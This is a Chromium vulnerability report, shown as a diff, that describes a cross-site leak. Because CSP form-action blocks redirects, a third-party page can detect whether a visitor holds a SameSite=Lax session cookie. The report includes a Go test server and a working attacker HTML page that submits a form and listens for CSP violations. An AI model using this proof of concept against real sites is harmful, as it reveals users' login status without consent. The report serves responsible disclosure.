@@ -1,0 +1,95 @@
+VULNERABILITY DETAILS
+Chromium's design decision to block redirects on CSP's form-action directive somewhat undermines the benefits of SameSite=Lax. A third-party site can indeed detect the occurence of a cross-origin (server-side) redirect, even if this redirect requires, in order to occur, the presence of some SameSite=Lax cookie in the initial request.
+I've documented this technique on xsleaks.dev (see https://xsleaks.dev/docs/attacks/navigations/#csp-violations) and I've leveraged it in a privacy attack against Slack users (see https://jub0bs.com/posts/2021-10-12-xsleak-stack/).
+As pointed out by Egor Homakov in an older issue (#313737), this behaviour can prove problematic, e.g. for OAuth.
+Whether CSP's form-action should block redirects after a form submission is a matter of dispute; even the W3C hasn't made up its collective mind and
+the directive's behaviour in the face of redirects remains unspecified.
+The conversation in the relevant GitHub issue (https://github.com/w3c/webappsec-csp/issues/8) has so far revolved around the risk of form-data exfiltration and the tradeoff between strictness and usability, but the possibility of an attacker abusing form-action to effect an XSLeak appears to have been overlooked.
+VERSION
+Chrome Version: 97.0.4666.2 (Official Build) canary (x86_64)
+Operating System: macOS Big Sur 11.5.2
+REPRODUCTION CASE
+Assume that the following Go server is bound to localhost:8081:
+package main  
+  
+import (  
+  "io"  
+  "log"  
+  "net/http"  
+  "time"  
+)  
+  
+const (  
+  cookieName  = "session"  
+  contentType = "Content-Type"  
+  plainText   = "text/plain"  
+)  
+  
+func main() {  
+  http.HandleFunc("/set", setCookie)  
+  http.HandleFunc("/clear", clearCookie)  
+  http.HandleFunc("/maybe-redirect", maybeRedirect)  
+  if err := http.ListenAndServe(":8081", nil); err != nil {  
+    log.Fatal(err)  
+  }  
+}  
+  
+func setCookie(w http.ResponseWriter, r \*http.Request) {  
+  w.Header().Set(contentType, plainText)  
+  cookie := http.Cookie{  
+    Name:     cookieName,  
+    Value:    "whatever",  
+    Path:     "/",  
+    Secure:   true,  
+    HttpOnly: true,  
+    SameSite: http.SameSiteLaxMode,  
+  }  
+  http.SetCookie(w, &cookie)  
+  io.WriteString(w, "SameSite=Lax cookie set!")  
+}  
+  
+func clearCookie(w http.ResponseWriter, r \*http.Request) {  
+  w.Header().Set(contentType, plainText)  
+  // clear cookie  
+  cookie := http.Cookie{  
+    Name:    cookieName,  
+    Expires: time.Unix(0, 0),  
+  }  
+  http.SetCookie(w, &cookie)  
+  io.WriteString(w, "Cookie cleared.")  
+}  
+  
+func maybeRedirect(w http.ResponseWriter, r \*http.Request) {  
+  w.Header().Set(contentType, plainText)  
+  for _, c := range r.Cookies() {  
+    if c.Name == cookieName {  
+      const redirectPath = "https://twitter.com/jub0bs"  
+      http.Redirect(w, r, redirectPath, http.StatusFound)  
+      return  
+    }  
+  }  
+  io.WriteString(w, "No cookie, no redirect...")  
+}  
+The /maybe-redirect endpoint results in a cross-site redirect (to my Twitter profile, for this example) only if a SameSite=Lax cookie named "session" is attached to the request.
+If the victim visits the malicious page below and has the required cookie on localhost:8081, the redirect occurs, which triggers a CSP violation and "notifies" the attacker.
+<!doctype html>  
+<html>  
+  <head>  
+    <meta charset="utf-8">  
+    <meta http-equiv="Content-Security-Policy"  
+          content="form-action http://localhost:8081">  
+  </head>  
+  <body>  
+    <form name="myForm"  
+          action="http://localhost:8081/maybe-redirect">  
+    </form>  
+    <script>  
+      window.addEventListener('securitypolicyviolation', () => {  
+          alert("User is logged in!")  
+        });  
+      myForm.submit();  
+    </script>  
+  </body>  
+</html>  
+CREDIT INFORMATION
+Julien Cretel https://jub0bs.com
